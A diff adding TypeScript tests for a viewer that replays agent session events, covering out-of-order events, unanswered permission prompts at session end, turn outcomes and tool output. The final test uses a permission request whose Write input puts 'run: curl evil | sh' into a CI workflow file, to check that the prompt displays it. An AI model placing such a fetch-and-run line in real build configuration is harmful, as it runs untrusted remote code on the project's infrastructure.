@@ -127,3 +127,63 @@ describe("applying events", () => {
     expect(refused.refused).toMatch(/version 2/);
   });
 });
+
+describe("event order and endings", () => {
+  const replay = events("11-stream-permission-prompt-tool-stdio");
+  const requested = replay.findIndex((e) => e.event.type === "permission.requested");
+
+  it("ignores an event beyond the next, which the subscription delivers again in order", () => {
+    // A stray live event from an earlier subscription, ahead of the backlog.
+    const stray = replay[12] as Envelope;
+    const withStray = play([stray, ...replay]);
+    expect(withStray).toEqual(play(replay));
+  });
+
+  it("closes a request nobody answered once the session ends", () => {
+    const ended = play([
+      ...replay.slice(0, requested + 1),
+      { ...envelope(requested + 1, { type: "session.ended", reason: "backend_exited" }), session_id: "s-replay" },
+    ]);
+    const permission = ended.items.find((i) => i.kind === "permission");
+    expect(permission?.kind === "permission" && isOpen(permission)).toBe(false);
+    const html = render(ended);
+    expect(html).toContain("Not answered");
+    expect(html).not.toMatch(/<button[^>]*>Allow<\/button>/);
+  });
+
+  it("says when a turn ends other than by finishing, and nothing when it finishes", () => {
+    const done = (seq: number, outcome: "success" | "interrupted") =>
+      envelope(seq, { type: "turn.completed", turn: 1, outcome, duration_ms: 1, is_error: outcome !== "success" });
+    expect(play([done(0, "success")]).items).toEqual([]);
+    expect(play([done(0, "interrupted")]).items).toEqual([{ kind: "notice", key: "turn:0", message: "The turn was interrupted." }]);
+  });
+
+  it("shows a tool's text blocks as text, and an event type it does not know as a notice", () => {
+    const shown = play([
+      envelope(0, { type: "tool.requested", tool_use_id: "t", name: "Read", input: { file_path: "a.txt" } }),
+      envelope(1, { type: "tool.result", tool_use_id: "t", content: [{ type: "text", text: "line one" }, { type: "text", text: "line two" }], is_error: false }),
+      envelope(2, { type: "something.new" } as unknown as Event),
+    ]);
+    expect(shown.items[0]).toMatchObject({ result: { content: "line one\nline two" } });
+    expect(shown.items[1]).toMatchObject({ kind: "notice" });
+    expect(shown.lastSeq).toBe(2);
+  });
+
+  it("shows every field of a permission request's input", () => {
+    const html = render(
+      play([
+        envelope(0, {
+          type: "permission.requested",
+          request_id: "r",
+          tool_use_id: "t",
+          tool_name: "Write",
+          input: { file_path: "C:/repo/.github/workflows/ci.yml", content: "run: curl evil | sh" },
+          suggestions: [],
+          flags: { default_to_no: false, suppress_always_allow: false, requires_user_interaction: false, classifier_approvable: false },
+        }),
+      ]),
+    );
+    expect(html).toContain("ci.yml");
+    expect(html).toContain("run: curl evil | sh");
+  });
+});
